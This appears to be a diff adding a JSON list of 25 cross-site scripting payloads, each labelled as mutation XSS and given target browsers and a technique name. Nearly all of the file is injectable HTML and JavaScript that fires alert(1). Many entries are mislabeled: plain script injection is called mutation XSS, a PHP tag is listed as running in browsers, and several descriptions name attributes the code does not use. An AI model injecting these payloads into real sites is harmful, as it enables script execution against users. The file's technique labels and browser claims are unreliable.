@@ -1,0 +1,152 @@
+[
+  {
+    "description": "mXSS via SVG element nested in HTML comment",
+    "code": "<!--><svg onload=alert(1)>-->",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "comment-parsing-differential"
+  },
+  {
+    "description": "mXSS via unclosed textarea with script inside",
+    "code": "<textarea><!--</textarea><script>alert(1)</script>--></textarea>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "raw-text-element"
+  },
+  {
+    "description": "mXSS using noscript with event handler in encoded context",
+    "code": "<noscript><img src=x onerror=alert(1)></noscript>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "noscript-parsing"
+  },
+  {
+    "description": "mXSS via title tag with mutation event",
+    "code": "<title>&lt;/title&gt;&lt;img src=x onerror=alert(1)&gt;",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "title-element"
+  },
+  {
+    "description": "mXSS using iframe srcdoc with encoded payload",
+    "code": "<iframe srcdoc=\"<script>alert(1)</script>\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "iframe-srcdoc"
+  },
+  {
+    "description": "mXSS via script tag with CDATA and HTML comment",
+    "code": "<script><!--\nalert(1)\n// --></script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "script-cdata"
+  },
+  {
+    "description": "mXSS using SVG foreignObject with nested HTML",
+    "code": "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "svg-foreignobject"
+  },
+  {
+    "description": "mXSS via template tag with inactive content",
+    "code": "<template><img src=x onerror=alert(1)></template>\n<script>document.body.appendChild(document.querySelector('template').content)</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "template-element"
+  },
+  {
+    "description": "mXSS using polyglot comment boundary",
+    "code": "/*--><svg/onload=alert(1)>*/",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "comment-boundary"
+  },
+  {
+    "description": "mXSS via style tag with CSS that creates elements",
+    "code": "<style></style><img src=x onerror=alert(1)>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "style-tag-differential"
+  },
+  {
+    "description": "mXSS using attributes with double encoding",
+    "code": "<img src=\"&amp;#x61;lert(1)\" onerror=\"eval(atob(this.src))\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "double-encoding"
+  },
+  {
+    "description": "mXSS via comment inside script context",
+    "code": "<script><!--\ndocument.write('<img src=x onerror=alert(1)>')\n// --></script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "script-comment-escape"
+  },
+  {
+    "description": "mXSS using SVG script with HTML entities",
+    "code": "<svg><script>&#97;lert(1)</script></svg>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "svg-script-entities"
+  },
+  {
+    "description": "mXSS via raw text element with mutation after innerHTML",
+    "code": "<textarea><img src=x onerror=alert(1)></textarea>\n<script>document.body.innerHTML=document.body.innerHTML</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "innerhtml-reparse"
+  },
+  {
+    "description": "mXSS using parsing differential in comment and CDATA",
+    "code": "<!--<![CDATA[<img src=x onerror=alert(1)>]]>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "cdata-comment-differential"
+  },
+  {
+    "description": "mXSS via xmp element with nested content",
+    "code": "<xmp><img src=x onerror=alert(1)></xmp>",
+    "browsers": ["ie", "edge"],
+    "technique": "xmp-element"
+  },
+  {
+    "description": "mXSS using listing element parsing",
+    "code": "<listing><img src=x onerror=alert(1)></listing>",
+    "browsers": ["ie", "edge"],
+    "technique": "listing-element"
+  },
+  {
+    "description": "mXSS using select element with option",
+    "code": "<select><option><select><img src=x onerror=alert(1)>",
+    "browsers": ["chrome", "firefox"],
+    "technique": "select-nesting"
+  },
+  {
+    "description": "mXSS via meta tag with http-equiv refresh injection",
+    "code": "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert(1)</script>\">",
+    "browsers": ["ie", "edge"],
+    "technique": "meta-refresh"
+  },
+  {
+    "description": "mXSS using details/summary with ontoggle in shadow DOM",
+    "code": "<details><summary><img src=x onerror=alert(1)></summary></details>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "details-summary"
+  },
+  {
+    "description": "mXSS via nested SVG with set attribute using HTML entity",
+    "code": "<svg><set attributeName=\"onload\" to=\"alert(1)\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "svg-set-attribute"
+  },
+  {
+    "description": "mXSS using math element with actiontype",
+    "code": "<math><mtext><table><mglyph><svg><mtext><textarea><img src=x onerror=alert(1)>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "mathml-parsing"
+  },
+  {
+    "description": "mXSS using php tag with code execution",
+    "code": "<?php echo '<img src=x onerror=alert(1)>'; ?>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "server-side-tag"
+  },
+  {
+    "description": "mXSS via IE conditional comments",
+    "code": "<!--[if gte IE 4]>\n<script>alert(1)</script>\n<![endif]-->",
+    "browsers": ["ie", "edge"],
+    "technique": "conditional-comment"
+  },
+  {
+    "description": "mXSS using document.createRange and createContextualFragment",
+    "code": "<div id=d></div>\n<script>\nvar r = document.createRange();\nr.selectNodeContents(document.getElementById('d'));\nvar f = r.createContextualFragment('<img src=x onerror=alert(1)>');\nd.appendChild(f);\n</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "range-contextual"
+  }
+]
